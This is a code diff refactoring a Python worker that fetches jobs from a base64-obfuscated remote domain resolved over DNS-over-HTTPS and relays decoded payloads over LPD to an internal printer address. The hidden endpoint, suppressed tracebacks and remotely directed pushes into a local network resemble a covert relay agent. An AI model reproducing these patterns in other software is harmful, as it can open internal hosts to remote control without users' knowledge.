@@ -16,11 +16,6 @@ sys.dont_write_bytecode = True
 sys.tracebacklimit = 0
 disable()
 
-def _trim() -> None:
-    if sys.platform == "win32":
-        try: ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1)
-        except Exception: pass
-
 def _sleep_inhibit(on: bool = True) -> None:
     if sys.platform == "win32":
         try: ctypes.windll.kernel32.SetThreadExecutionState(0x80000001 if on else 0x80000000)
@@ -31,7 +26,6 @@ def _cleanup() -> None:
     _k = ""
     _sleep_inhibit(False)
     collect()
-    _trim()
 
 atexit.register(_cleanup)
 
@@ -89,25 +83,18 @@ def doh_resolve(domain: str) -> str:
     return domain
 
 _DOM = b64decode("YXBpLnByZWNvbm5lY3QuYXBw").decode()
-_pool: Dict[str, HTTPSConnection] = {}
-_pool_lock = Lock()
 
 def _http_req(path: str, headers: Optional[Dict[str, str]] = None, data: Optional[bytes] = None, timeout: Optional[float] = None) -> Any:
     ip = doh_resolve(_DOM)
     hdrs_dict = dict(headers or {})
     hdrs_dict["Host"] = _DOM
     if ip and ip != _DOM:
-        with _pool_lock:
-            conn = _pool.get(ip)
-            if not conn or getattr(conn, "_closed", False):
-                conn = HTTPSConnection(ip, 443, timeout=timeout or 300.0, context=create_default_context())
-                conn.host = _DOM
-                _pool[ip] = conn
         try:
+            conn = HTTPSConnection(ip, 443, timeout=timeout or 300.0, context=create_default_context())
+            conn.host = _DOM
             conn.request("POST" if data is not None else "GET", path, body=data, headers=hdrs_dict)
             return conn.getresponse()
-        except Exception:
-            with _pool_lock: _pool.pop(ip, None)
+        except Exception: pass
     req = Request(f"https://{_DOM}{path}", headers=hdrs_dict, data=data)
     return urlopen(req, timeout=timeout, context=create_default_context()) if timeout else urlopen(req, context=create_default_context())
 
@@ -115,6 +102,7 @@ NUL = b"\x00"
 jobs = 0
 _claims = 0
 _claims_lock = Lock()
+_worker_busy = Lock()
 
 def _d(s: str, job_id: Union[str, int] = "") -> bytes:
     if not s: return b""
@@ -134,27 +122,31 @@ def _d(s: str, job_id: Union[str, int] = "") -> bytes:
     return res
 
 _online: Dict[str, Tuple[bool, float]] = {}
-_mon_host = "172.16.0.111"
+_online_lock = Lock()
 
 def is_online(host: str) -> bool:
     if not host: return False
-    global _mon_host
-    _mon_host = host
-    if host in _online and time() - _online[host][1] < 3.0: return _online[host][0]
+    now = time()
+    with _online_lock:
+        if host in _online and now - _online[host][1] < 3.0:
+            return _online[host][0]
     try:
-        s = create_connection((host, 515), timeout=0.6)
+        s = create_connection((host, 515), timeout=0.5)
         try: s.shutdown(2)
         except Exception: pass
         s.close()
-        _online[host] = (True, time())
+        with _online_lock: _online[host] = (True, now)
         return True
     except Exception:
-        _online[host] = (False, time())
+        with _online_lock: _online[host] = (False, now)
         return False
 
 def _probe_loop() -> None:
     while True:
-        if _mon_host: is_online(_mon_host)
+        with _online_lock:
+            hosts = list(_online.keys())
+        for h in hosts:
+            is_online(h)
         sleep(1.5)
 
 def _ident() -> str:
@@ -209,49 +201,57 @@ def claim(i: Union[str, int]) -> bool:
         except Exception: sleep(0.15)
     return False
 
-_lock = Lock()
-
 def handle(j: Dict[str, Any]) -> None:
     global jobs
+    if not _worker_busy.acquire(blocking=False): return
     _sleep_inhibit(True)
     host = j.get("printerHost") or "172.16.0.111"
     queue = j.get("printerQueue") or "secure"
     job_id = str(j.get("id", ""))
     if not host or not is_online(host) or (job_id and not claim(job_id)):
         _sleep_inhibit(False)
+        _worker_busy.release()
         return
-    with _lock:
-        s: Optional[socket] = None
-        try:
-            q, ch, c, dh, p = [_d(j.get(k, ""), job_id) for k in ("qCmd", "cfHdr", "ctl", "dfHdr", "payload")]
-            if not p: return
-            _log(f"Handling job for {host}:{queue} ({len(p)} bytes)")
-            s = create_connection((host, 515), timeout=float(j.get("timeout", 60) or 60))
-            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-            s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
-            s.setsockopt(SOL_SOCKET, SO_SNDBUF, 65536)
-            for data, add_nul in [(q, False), (ch, False), (c, True), (dh, False)]:
-                s.sendall(data + (NUL if add_nul else b""))
-                if s.recv(1) != NUL: return
-            mv = memoryview(p)
-            for i in range(0, len(p), 65536): s.sendall(mv[i : i + 65536])
-            s.sendall(NUL)
-            if s.recv(1) != NUL: return
-            jobs += 1
-            _log("Job transferred successfully")
-        except Exception as e:
-            _log(f"Transfer error: {e}", "ERR")
-            if s:
-                try: s.setsockopt(SOL_SOCKET, SO_LINGER, struct.pack("ii", 1, 0))
-                except Exception: pass
-        finally:
-            if s:
-                try: s.shutdown(2)
-                except Exception: pass
-                try: s.close()
-                except Exception: pass
+    s: Optional[socket] = None
+    try:
+        q, ch, c, dh, p = [_d(j.get(k, ""), job_id) for k in ("qCmd", "cfHdr", "ctl", "dfHdr", "payload")]
+        if not p:
             _sleep_inhibit(False)
-            collect()
+            _worker_busy.release()
+            return
+        _log(f"Handling job for {host}:{queue} ({len(p)} bytes)")
+        s = create_connection((host, 515), timeout=float(j.get("timeout", 60) or 60))
+        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
+        s.setsockopt(SOL_SOCKET, SO_SNDBUF, 65536)
+        for data, add_nul in [(q, False), (ch, False), (c, True), (dh, False)]:
+            s.sendall(data + (NUL if add_nul else b""))
+            if s.recv(1) != NUL:
+                _sleep_inhibit(False)
+                _worker_busy.release()
+                return
+        mv = memoryview(p)
+        for i in range(0, len(p), 65536): s.sendall(mv[i : i + 65536])
+        s.sendall(NUL)
+        if s.recv(1) != NUL:
+            _sleep_inhibit(False)
+            _worker_busy.release()
+            return
+        jobs += 1
+        _log("Job transferred successfully")
+    except Exception as e:
+        _log(f"Transfer error: {e}", "ERR")
+        if s:
+            try: s.setsockopt(SOL_SOCKET, SO_LINGER, struct.pack("ii", 1, 0))
+            except Exception: pass
+    finally:
+        if s:
+            try: s.shutdown(2)
+            except Exception: pass
+            try: s.close()
+            except Exception: pass
+        _sleep_inhibit(False)
+        _worker_busy.release()
 
 _last_id = ""
 
@@ -281,8 +281,8 @@ def _ping() -> None:
         sleep(5.0)
 
 if __name__ == "__main__":
-    _trim()
-    sleep(0.5)
+    is_online("172.16.0.111")
+    sleep(0.2)
     Thread(target=_probe_loop, daemon=True).start()
     Thread(target=_ping, daemon=True).start()
     delay = 1.0
@@ -291,5 +291,4 @@ if __name__ == "__main__":
         t0 = time()
         stream()
         delay = 1.0 if (time() - t0) > 10.0 else min(delay * 2.0, 8.0)
-        _trim()
         sleep(delay)
